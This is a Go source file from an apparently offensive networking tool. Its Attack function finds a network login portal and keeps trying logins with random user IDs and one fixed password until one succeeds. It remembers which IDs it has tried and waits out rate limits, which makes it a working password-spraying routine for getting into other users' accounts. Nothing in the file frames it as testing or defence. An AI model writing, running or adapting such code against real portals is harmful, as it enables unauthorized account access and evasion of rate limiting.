package auth

import (
	"fmt"
	"time"

	"nmnm.cc/easy-net/internal/log"
)

type AttackConfig struct {
	Host     string
	Base     string
	Link     string
	Password string
	Timeout  time.Duration
	// TargetSpeed string
}

var attackLogger = log.New("auth/attack")

func Attack(cfg *AttackConfig) error {
	tried := make(map[string]struct{})

	for {
		userid := RandomUserid()

	TooFastRetry:

		if cfg.Base == "" {
			base, err := FindPortal(cfg.Host, cfg.Link)
			if err != nil {
				return fmt.Errorf("failed to find portal: %w", err)
			}
			cfg.Base = base
		}

		if _, ok := tried[userid]; ok {
			continue
		} else {
			tried[userid] = struct{}{}
		}

		if err := Login(&LoginConfig{
			Base:     cfg.Base,
			Link:     cfg.Link,
			UserID:   userid,
			Password: cfg.Password,
		}); err != nil {
			switch err {
			case ErrTooFast:
				attackLogger.Warn("too fast, try again later")
				time.Sleep(30 * time.Second)
				goto TooFastRetry
			default:
				attackLogger.Warn("failed to login", "error", err)
				continue
			}

		}

		break
	}

	return nil
}
